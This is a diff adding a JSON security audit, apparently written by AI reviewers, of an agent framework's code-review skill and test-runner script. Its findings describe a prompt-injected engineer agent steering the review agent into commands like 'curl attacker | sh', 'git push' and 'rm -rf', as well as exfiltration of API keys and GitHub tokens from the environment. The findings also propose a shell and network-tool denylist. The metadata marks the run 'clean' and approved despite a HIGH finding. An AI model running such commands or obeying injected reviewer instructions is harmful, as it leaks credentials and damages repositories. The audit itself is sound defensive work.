@@ -1,0 +1,150 @@
+{
+  "findings": [
+    {
+      "id": "DISS-C-001",
+      "severity": "HIGH",
+      "category": "authz",
+      "anchor": ".claude/skills/reviewing-code/SKILL.md:allowed-tools",
+      "anchor_type": "line",
+      "anchor_line": 6,
+      "anchor_line_end": 6,
+      "scope": "cross_file",
+      "trigger_anchor": ".claude/scripts/red-test-check.sh:run_bounded",
+      "cross_file_justification": "SKILL.md (diff-touched) adds `Bash(.claude/scripts/red-test-check.sh *)` to the review role's Bash allowlist; red-test-check.sh (diff-touched) execs whatever follows `--` and whatever `--setup` names, so the allowlist entry is a generic command executor.",
+      "description": "The reviewing-code role was deliberately restricted to `git diff`, `git log` and a fixed set of scripts, with Write/Edit limited to the State zone. The new allowlist line permits `red-test-check.sh` with any arguments. Inside the script, `run_bounded` does `exec \"$@\"` on the argv after `--` (and on the whitespace-split `--setup` string) with cwd in a worktree but with the reviewer's full environment, uid and filesystem access. The script only validates `--red`/`--green`/`--timeout`; the test command itself is unconstrained. SKILL.md Phase 2 instructs the reviewer to take the red commit from the engineer-authored `reviewer.md` and run the test command from there, so an engineer agent (or a prompt-injected PR description/test file) can direct the reviewer to run `-- curl attacker | sh`, `-- git push`, `-- rm -rf ../..` etc. This collapses the reviewer's least-privilege boundary (C-PROC-001 zones, ICE push guard) through a single allowlisted wrapper.",
+      "failure_mode": "A compromised or injected implementing agent writes a `Red commit:` line and a test command of its choosing into reviewer.md; the review agent, following Phase 2, invokes red-test-check.sh with that command and the Bash allowlist lets it through, giving arbitrary code execution and write/push access from the review role that is supposed to be near read-only.",
+      "suggested_fix": "Do not expose a generic argv executor to the reviewer. Options: (a) have red-test-check.sh accept only a fixed set of runner names (e.g. `--runner bats|pytest|npm-test|cargo-test|go-test`) plus a `--test-file`, and build the argv internally; (b) read the test command from a committed, reviewed config (e.g. `.loa.config.yaml: bug.test_command`) instead of CLI/reviewer.md; (c) at minimum narrow the SKILL.md entry to `Bash(.claude/scripts/red-test-check.sh --red * -- bats *)` style patterns and drop `--setup` from the reviewer path. Also have the script refuse argv[0] values that are shells or network tools (`bash`, `sh`, `curl`, `wget`, `python -c`).",
+      "anchor_status": "valid",
+      "anchor_stability": "symbol",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-002",
+      "severity": "MEDIUM",
+      "category": "config",
+      "anchor": ".claude/scripts/red-test-check.sh:link_deps",
+      "anchor_type": "function",
+      "anchor_line": 221,
+      "anchor_line_end": 230,
+      "scope": "diff",
+      "trigger_anchor": null,
+      "cross_file_justification": null,
+      "description": "`link_deps` is on by default and symlinks the live tree's `node_modules`, `.venv`, `vendor`, `target` and `.tox` into both detached worktrees before the test runs. The test command then executes code from the red and green commits, which are PR-controlled, with write access through those symlinks into the reviewer's live dependency directories. A malicious or compromised commit can plant a modified module (e.g. a patched `node_modules/.bin/jest` or a `.venv` sitecustomize) that executes on every later run in the live tree, long after the worktrees are removed. The header acknowledges the behaviour, but the safe mode (`--no-link-deps`) is opt-in and the reviewer skill does not instruct its use.",
+      "failure_mode": "Attacker-controlled test at the red commit writes into `${MAIN}/node_modules` via the symlink; subsequent legitimate test/tool invocations in the live checkout execute the planted code with the operator's privileges, persisting across the review.",
+      "suggested_fix": "Make dependency linking opt-in (`--link-deps`) or mount the directories read-only (copy with `cp -a`/hardlink farm, or bind-mount read-only where available). If symlinking stays, document in SKILL.md that the reviewer must pass `--no-link-deps` for /bug reviews of untrusted branches.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-003",
+      "severity": "MEDIUM",
+      "category": "info-disclosure",
+      "anchor": ".claude/scripts/red-test-check.sh:run_bounded",
+      "anchor_type": "line",
+      "anchor_line": 247,
+      "anchor_line_end": 249,
+      "scope": "diff",
+      "trigger_anchor": null,
+      "cross_file_justification": null,
+      "description": "The test argv is exec'd after only `unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_PREFIX`; every other environment variable of the reviewer process is inherited. The reviewing-code skill runs inside an agent session that typically holds model-provider credentials for Cheval/Flatline dispatch, GitHub tokens for Bridgebuilder, and similar. The code under test comes from the red/green commits, i.e. from the PR author, so a hostile test file can read and exfiltrate those secrets. The `red_tail`/`green_tail` output is also echoed back into the review transcript and JSON, so any secret a test prints lands in tracked review artifacts.",
+      "failure_mode": "A test at the red commit does `console.log(process.env)` or posts `env` to an external host; keys for the model provider or GitHub leak, and the stdout tail copies them into engineer-feedback/trajectory files.",
+      "suggested_fix": "Run the test argv under `env -i` with an explicit allowlist (`PATH`, `HOME`, `LANG`, `TMPDIR`, runner-specific vars) or at least `unset` known credential variables (ANTHROPIC_API_KEY, OPENAI_API_KEY, GITHUB_TOKEN, GH_TOKEN, AWS_*). Consider passing the captured tails through the existing pii-filter before printing.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-004",
+      "severity": "LOW",
+      "category": "input-validation",
+      "anchor": ".claude/scripts/validate-artifact.sh:validate_glossary",
+      "anchor_type": "function",
+      "anchor_line": 1260,
+      "anchor_line_end": 1326,
+      "scope": "diff",
+      "trigger_anchor": null,
+      "cross_file_justification": null,
+      "description": "`validate_glossary` passes `\"$FILE\"` as a bare awk operand and also via `-v f=\"$FILE\"`. An operand of the form `name=value` is treated by awk as a variable assignment, not a file, so awk falls back to stdin and the validation silently reads nothing (or hangs). The `-v` value additionally undergoes backslash-escape processing, so filenames containing `\\n` or `\\t` are mangled in the emitted violation messages. This is a robustness gap in a fail-closed validator rather than a direct vulnerability, and the same pattern likely exists in the sibling validators.",
+      "failure_mode": "A glossary path such as `docs/a=b/GLOSSARY.md` causes awk to treat the operand as an assignment; with stdin attached the validator blocks, with stdin closed it reports 'no H1' against the wrong input.",
+      "suggested_fix": "Pass the file as `./\"$FILE\"` or precede it with a `--`-equivalent by using `awk '...' /dev/stdin < \"$FILE\"`, and set `f` via `ENVIRON` (`F=\"$FILE\" awk '... ENVIRON[\"F\"] ...'`) to avoid escape processing.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    }
+  ],
+  "metadata": {
+    "type": "audit",
+    "model": "gpt-5.5-pro",
+    "sprint_id": "sprint-1",
+    "timestamp": "2026-10-20T06:11:42Z",
+    "status": "clean",
+    "status_note": "no findings met the BLOCKING/ADVISORY bar — not an approval of unreviewed surface",
+    "degraded": false,
+    "schema_enforced": false,
+    "parse_path": "normalized",
+    "model_attempts": [
+      "gpt-5.5-pro:clean"
+    ],
+    "final_model": "gpt-5.5-pro",
+    "budget_scale": "diff",
+    "budget_cents_effective": 257,
+    "budget_cents_max": 600,
+    "rejected_summary": [],
+    "rejected_count": 0,
+    "cost_usd": 0,
+    "tokens_input": 2,
+    "tokens_output": 8892,
+    "companion_voice": {
+      "planned": true,
+      "family": "anthropic",
+      "family_basis": "configured_primary",
+      "chain": [
+        "claude-headless"
+      ],
+      "shared_hops": [
+        "claude-headless"
+      ],
+      "model": "claude-headless",
+      "answered_by": "claude-headless",
+      "status": "succeeded",
+      "failure_class": null,
+      "cost_cents": 0,
+      "attempts": [
+        "claude-headless:reviewed"
+      ],
+      "independent": true,
+      "counted_as": "independent_voice",
+      "primary_succeeded_model": "codex-headless",
+      "rejected_sidecar": null
+    },
+    "rejected_sidecars": [],
+    "hallucination_filter": {
+      "applied": true,
+      "downgraded": 0
+    },
+    "scope": {
+      "diff_range": null,
+      "diff_oids": null,
+      "diff_sha256": "5abd065addfa5208dab1f2216fa61de73ca0674c5b114b90c537236a4ef76e59",
+      "run_tag": null
+    }
+  },
+  "verdict_quality": {
+    "consensus_outcome": "consensus",
+    "truncation_waiver_applied": false,
+    "voices_planned": 2,
+    "voices_succeeded": 2,
+    "voices_succeeded_ids": [
+      "codex-headless",
+      "claude-headless"
+    ],
+    "voices_dropped": [],
+    "chain_health": "ok",
+    "confidence_floor": "high",
+    "rationale": "multi-voice aggregate (2/2 succeeded); chain_health=ok",
+    "single_voice_call": false,
+    "status": "APPROVED"
+  }
+}
